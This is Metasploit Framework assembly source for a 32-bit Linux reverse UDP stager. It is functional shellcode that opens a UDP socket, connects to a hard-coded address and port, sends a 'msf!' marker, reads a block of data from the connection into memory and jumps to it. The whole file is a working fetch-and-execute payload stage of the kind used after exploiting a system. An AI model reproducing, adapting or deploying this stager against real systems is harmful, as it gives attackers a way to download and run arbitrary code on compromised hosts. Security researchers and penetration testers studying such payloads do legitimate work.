;;
; 
;        Name: stager_sock_reverse_udp
;   Qualities: Can Have Nulls
;   Platforms: Linux
;     Authors: skape <mmiller [at] hick.org>
;     Version: $Revision: 1449 $
;     License: 
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Implementation of a Linux reverse UDP stager.
;
;        File descriptor in edi.
;
;;
BITS   32
GLOBAL _start

_start:
	xor  ebx, ebx

socket:
	push ebx
	push byte 0x2
	push byte 0x2
	inc  ebx
	push byte 0x66
	pop  eax
	cdq
	mov  ecx, esp
	int  0x80
	xchg eax, edi

connect:
	pop  ebx
	push dword 0x0100007f
	push word 0xbfbf
	push word bx
	mov  ecx, esp
	push byte 0x10
	push ecx
	push edi
	mov  ecx, esp
	mov  al, 0x66
	inc  ebx
	int  0x80

write:
	pop  ebx
	push dword 0x2166736d
	mov  ecx, esp
	mov  dl, 0x4
	mov  al, 0x4
	int  0x80

%ifndef USE_SINGLE_STAGE

recv:
	mov  dh, 0xc
	mov  al, 0x3
	int  0x80
	jmp  ecx
%else
	mov  edi, ebx
%endif
